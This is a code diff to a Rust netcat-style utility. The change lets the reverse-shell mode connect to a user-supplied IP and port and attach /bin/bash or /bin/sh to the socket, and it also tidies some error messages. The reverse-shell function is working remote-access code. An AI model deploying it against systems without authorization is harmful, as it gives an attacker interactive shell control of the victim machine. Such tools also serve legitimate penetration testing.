@@ -56,7 +56,7 @@ fn print_error(err: &str) {
     );
 }
 
-/* Print when connection recieved */
+/* Print when started listening */
 fn print_started_listen(opts: &Opts) {
     println!(
         "Listening on {}{}{}:{}{}{}",
@@ -68,6 +68,20 @@ fn print_started_listen(opts: &Opts) {
         color::Fg(color::Reset)
     );
 }
+
+// Commented, becuase I dont know if this will work in non terminal enviroments
+/* Print when reverse shell started */
+/*fn print_started_revshell(ip: String, port: String) {
+    println!(
+        "Started Reverse Shell on {}{}{}:{}{}{}",
+        color::Fg(color::LightGreen),
+        ip,
+        color::Fg(color::Reset),
+        color::Fg(color::LightCyan),
+        port,
+        color::Fg(color::Reset)
+    );
+}*/
 
 /* Piped thread */
 fn pipe_thread<R, W>(mut r: R, mut w: W) -> std::thread::JoinHandle<()>
@@ -199,7 +213,7 @@ fn listen(opts: &Opts) -> std::io::Result<()> {
 }
 
 /* Open A Sh/Bash Reverse Shell */
-fn revshell(port: String, shell: String){
+fn revshell(ip: String, port: String, shell: String){
     // Limit to just these 
     if shell != "bash" && shell != "sh"
     {
@@ -207,18 +221,21 @@ fn revshell(port: String, shell: String){
         return;
     }
 
-    let full: String = ["0.0.0.0", &port].join(":");
-    
+    let full: String = format!("{}:{}", ip, port);
     let socket = Socket::new(Domain::ipv4(), Type::stream(), None).unwrap();
 
     match socket.connect(&full.parse::<SocketAddr>().unwrap().into()) {
         Ok(_) => {}
-        Err(err) => print_error(&err.to_string())
+        Err(err) => {
+                print_error(&err.to_string());
+                return;
+            }
     }
 
     let s = socket.into_tcp_stream();
-
     let fd = s.as_raw_fd();
+
+    //print_started_revshell(ip, port);
 
     // Open shell
     Command::new(format!("/bin/{}", shell))
@@ -230,7 +247,6 @@ fn revshell(port: String, shell: String){
         .unwrap()
         .wait()
         .unwrap();
-
 
     println!("Shell exited");
 }
@@ -269,19 +285,24 @@ fn main() {
 
     // Reverse Shell
     if matches.opt_present("r") {
+        let opt_host: String;
         let opt_port: String;
         let opt_shell: String;
 
-
         if matches.free.len() == 2 && matches.opt_present("p") {
+            opt_host = "0.0.0.0".to_string();
             opt_port = matches.free[0].to_string();
             opt_shell = matches.free[1].to_string();
+        } else if matches.free.len() == 3 {
+            opt_host = matches.free[0].to_string();
+            opt_port = matches.free[1].to_string();
+            opt_shell = matches.free[2].to_string();
         } else {
-            print_help(&program, opts);
+            print_error("Invalid Reverse Shell Mode Usage [ip] [port] [shell]");
             return;
         };
         
-        revshell(opt_port, opt_shell);
+        revshell(opt_host, opt_port, opt_shell);
         return;
     }
 
@@ -292,8 +313,9 @@ fn main() {
         } else if matches.free.len() == 2 {
             (matches.free[0].as_str(), matches.free[1].as_str())
         } else {
-            print_help(&program, opts);
-            ("", "")
+            print_error("Invalid Listen Mode Usage [ip] [port]");
+            ("", "");
+            return;
         };
 
         let opts = Opts {
